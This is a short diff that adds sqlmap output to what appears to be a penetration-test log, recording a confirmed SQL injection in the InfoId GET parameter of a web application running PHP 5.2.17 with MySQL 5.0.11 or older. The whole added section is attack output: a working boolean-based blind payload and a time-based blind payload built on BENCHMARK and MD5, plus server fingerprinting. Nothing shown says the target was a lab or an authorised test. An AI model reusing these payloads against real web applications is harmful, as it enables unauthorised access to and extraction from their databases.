@@ -12,3 +12,17 @@ Parameter: InfoId (GET)
 web server operating system: Windows
 web application technology: ASP.NET, PHP 5.2.17
 back-end DBMS: MySQL <= 5.0.11
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: InfoId (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: InfoId=286 AND 4642=4642
+
+    Type: AND/OR time-based blind
+    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
+    Payload: InfoId=286 AND 8932=BENCHMARK(5000000,MD5(0x70644548))
+---
+web server operating system: Windows
+web application technology: ASP.NET, PHP 5.2.17
+back-end DBMS: MySQL <= 5.0.11
